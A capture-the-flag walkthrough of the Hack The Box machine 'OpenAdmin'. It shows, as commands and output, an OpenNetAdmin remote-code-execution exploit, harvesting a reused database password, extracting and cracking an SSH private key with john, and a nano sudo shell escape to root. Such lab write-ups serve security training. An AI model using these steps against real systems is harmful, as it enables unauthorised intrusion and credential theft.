# OpenAdmin

<table>
  <tr>
    <td style="text-align:right;"><b>OS</b></td>
    <td>Linux</td>
  </tr>
  <tr>
    <td style="text-align:right;"><b>Difficulty</b></td>
    <td>Easy</td>
  </tr>
  <tr>
    <td style="text-align:right;"><b>Points</b></td>
    <td>20</td>
  </tr>
  <tr>
    <td style="text-align:right;"><b>Release</b></td>
    <td>04 Jan 2020</td>
  </tr>
  <tr>
    <td style="text-align:right;"><b>IP</b></td>
    <td>10.10.10.171</td>
  </tr>
</table>

## Foothold

To begin, we will add the entry `10.10.10.171 openadmin.htb` to `/etc/hosts` and then start scanning.

```
# nmap -sC -sV openadmin.htb
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From this we see that SSH and HTTP are open. If we try to browse to `http://openadmin.htb`, we see the default Apache2 page. From here, we will attempt some enumeration.

```
# dirb http://openadmin.htb/ /usr/share/wordlists/dirb/common.txt
...
---- Scanning URL: http://openadmin.htb/ ----
==> DIRECTORY: http://openadmin.htb/artwork/
+ http://openadmin.htb/index.html (CODE:200|SIZE:10918)
==> DIRECTORY: http://openadmin.htb/music/
+ http://openadmin.htb/server-status (CODE:403|SIZE:277)
...                 
```

From this, we see the index page we already found and two directories: `artwork` and `music`. After skimming through the index pages for these directories we see a login link on `music` which goes to the OpenNetAdmin console. What jumps out on this page is the warning about a newer version available. This hints that there is a vulnerability so we can attempt to find an exploit for `v18.1.1`.

![](images/ona.png)

```
# searchsploit opennetadmin
--------------------------------------- ----------------------------------------
 Exploit Title                         |  Path
                                       | (/usr/share/exploitdb/)
--------------------------------------- ----------------------------------------
OpenNetAdmin 13.03.01 - Remote Code Ex | exploits/php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Remote Code Exec | exploits/php/webapps/47691.sh
--------------------------------------- ----------------------------------------
```

There is actually an exploit for the exact version we have and with it we can achieve remote code execution. The script is in DOS mode so we have to quickly convert it so that it runs properly.

```
# dos2unix 47691.sh 
dos2unix: converting file 47691.sh to Unix format...
# ./47691.sh http://openadmin.htb/ona/
$ whoami
www-data
$ pwd
/opt/ona/www
```

## User

We are now a low level user account that is running the OpenNetAdmin service. From here we will have to enumerate further. We will attempt to search the files for interesting data.

```
$ grep -iR passwd *
...
local/config/database_settings.inc.php:        'db_passwd' => 'n1nj4W4rri0R!'
...
$ cat local/config/database_settings.inc.php
...
'db_type' => 'mysqli',
'db_host' => 'localhost',
'db_login' => 'ona_sys',
'db_passwd' => 'n1nj4W4rri0R!',
'db_database' => 'ona_default',
'db_debug' => false,
...
```

We find our first password, `n1nj4W4rri0R!`. Perhaps, whoever created this password reuses it as their system password. Let's try to find the other users on the system.

```
$ ls /home
jimmy
joanna
```

The other users on the system are Jimmy and Joanna. Now, we can try to SSH into their accounts using the password we found.

```
# ssh jimmy@openadmin.htb
jimmy@openadmin.htb's password: 
jimmy@openadmin:~$
```

Sure enough, Jimmy reused his user password in the database! Since we don't see `user.txt`, we assume that we still have to traverse and get into Joanna's account somehow. Since Jimmy's home directory is empty, there must be important files elsewhere on the system. Because he set up OpenNetAdmin, it's likely he does other administrative work on the box.

```
jimmy@openadmin:~$ find / -user jimmy 2>/dev/null
...
/var/www/internal
/var/www/internal/main.php
/var/www/internal/logout.php
/var/www/internal/index.php
```

We notice an interesting directory in `/var/www/`. The web server we looked at before is `/var/www/ona` and this directory is `/var/www/internal`. This suggests a separate web server hosted on the machine that can only be accessed on the inside.

If we start to look at the three files inside, we see that `index.php` is a login page, `logout.php` is obviously the logout page, and `main.php` is the main content. The important part though is that `main.php` is especially valuable. Let's see this important file:

```php
...
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
...
```

This page outputs Joanna's private key! If we get this, we can possibly crack it and SSH as Joanna. In order to run this file, we need to figure out which port it is on which is in its configuration file.

```
jimmy@openadmin:~$ cat /etc/apache2/sites-available/internal.conf 
Listen 127.0.0.1:52846
...
jimmy@openadmin:~$ curl localhost:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

Now that we have her private key, we can crack it using `john` and SSH to her account.

```
# ssh2john id_rsa > hash.txt
# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa)
...
```

Now that we have the password that's encrypting Joanna's private key, we can SSH as her and get the flag.

```
# chmod 600 id_rsa
# ssh -i id_rsa joanna@openadmin.htb
Enter passphrase for key 'id_rsa':
...
joanna@openadmin:~$ cat user.txt
c9b2cf**************************
```

## Root

Since the machine is on the latest version of Ubuntu, it is unlikely that there is a kernel privilege escalation exploit. Let's see if Joanna is allowed to run any programs as root.

```
$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Joanna is able to edit `/opt/priv` with `nano` as root without a password. We can now use [GTFOBins](https://gtfobins.github.io/gtfobins/nano/) in order to gain a shell as root and get the flag.

```
$ sudo /bin/nano /opt/priv
^R^X
reset; sh 1>&0 2>&0
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
2f907e**************************
```

